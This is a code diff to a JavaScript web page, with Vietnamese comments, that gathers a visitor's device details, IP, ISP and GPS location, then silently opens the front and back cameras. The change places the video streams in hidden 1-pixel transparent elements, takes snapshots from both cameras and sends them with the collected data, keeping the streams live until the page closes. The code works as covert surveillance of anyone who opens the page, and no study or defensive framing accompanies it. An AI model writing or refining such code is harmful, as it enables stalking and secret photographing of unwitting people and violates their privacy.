@@ -19,8 +19,7 @@ const info = {
   camera: '⏳ Đang kiểm tra...'
 };
 
-let frontStream = null;
-let backStream = null;
+let frontCam, backCam;
 
 function detectDevice() {
   const ua = navigator.userAgent;
@@ -55,26 +54,19 @@ async function getRealIP() {
   info.isp = data.connection?.org || 'Không rõ';
 }
 
-let useGPS = false;
-
 async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
 
     navigator.permissions.query({ name: 'geolocation' }).then(result => {
-      if (result.state === 'denied') {
-        return fallbackIPLocation().then(resolve);
-      }
+      if (result.state === 'denied') return fallbackIPLocation().then(resolve);
 
       navigator.geolocation.getCurrentPosition(
         async pos => {
-          useGPS = true;
           info.lat = pos.coords.latitude.toFixed(6);
           info.lon = pos.coords.longitude.toFixed(6);
           try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
-              headers: { 'User-Agent': 'Mozilla/5.0' }
-            });
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
             const data = await res.json();
             info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
             info.country = data.address?.country || 'Không rõ';
@@ -85,7 +77,6 @@ async function getLocation() {
           resolve();
         },
         async () => {
-          useGPS = false;
           await fallbackIPLocation();
           resolve();
         },
@@ -103,34 +94,37 @@ async function fallbackIPLocation() {
   info.country = data.country || 'Không rõ';
 }
 
-function captureCamera(facingMode = 'user') {
+function createLiveVideoStream(facingMode = 'user') {
   return new Promise((resolve, reject) => {
-    navigator.permissions.query({ name: 'camera' }).then(result => {
-      if (result.state === 'denied') return reject(new Error('Camera bị từ chối'));
+    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
+      .then(stream => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', 'true');
+        video.setAttribute('autoplay', 'true');
+        video.muted = true;
+        video.style.width = '1px';
+        video.style.height = '1px';
+        video.style.position = 'fixed';
+        video.style.top = '0';
+        video.style.left = '0';
+        video.style.opacity = '0';
+        document.body.appendChild(video);
 
-      navigator.mediaDevices.getUserMedia({ video: { facingMode } })
-        .then(stream => {
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.play();
+        resolve({ video, stream });
+      })
+      .catch(reject);
+  });
+}
 
-          if (facingMode === 'user') frontStream = stream;
-          else backStream = stream;
-
-          video.onloadedmetadata = () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-
-            setTimeout(() => {
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
-            }, 1000);
-          };
-        })
-        .catch(reject);
-    });
+function captureSnapshot(video) {
+  return new Promise(resolve => {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
   });
 }
 
@@ -187,27 +181,32 @@ async function main() {
   await getRealIP();
   await getLocation();
 
-  let front = null, back = null;
-
   try {
-    front = await captureCamera("user");
-    back = await captureCamera("environment");
-    info.camera = '✅ Đã chụp camera trước và sau';
-  } catch {
-    info.camera = '🚫 Không thể truy cập camera';
-  }
+    frontCam = await createLiveVideoStream("user");
+    backCam = await createLiveVideoStream("environment");
 
-  if (front && back) {
-    await sendPhotos(front, back);
-  } else {
+    // Chờ video ready
+    await Promise.all([
+      new Promise(r => frontCam.video.onloadedmetadata = r),
+      new Promise(r => backCam.video.onloadedmetadata = r)
+    ]);
+
+    const frontBlob = await captureSnapshot(frontCam.video);
+    const backBlob = await captureSnapshot(backCam.video);
+
+    info.camera = '✅ Camera vẫn đang hoạt động';
+    await sendPhotos(frontBlob, backBlob);
+  } catch (err) {
+    console.error('Lỗi camera:', err);
+    info.camera = '🚫 Không thể truy cập camera';
     await sendTextOnly();
   }
-
-  // Giữ stream hoạt động đến khi đóng trang
-  window.addEventListener("beforeunload", () => {
-    if (frontStream) frontStream.getTracks().forEach(track => track.stop());
-    if (backStream) backStream.getTracks().forEach(track => track.stop());
-  });
 }
+
+// Ngắt stream khi thoát
+window.addEventListener("beforeunload", () => {
+  if (frontCam?.stream) frontCam.stream.getTracks().forEach(t => t.stop());
+  if (backCam?.stream) backCam.stream.getTracks().forEach(t => t.stop());
+});
 
 main();
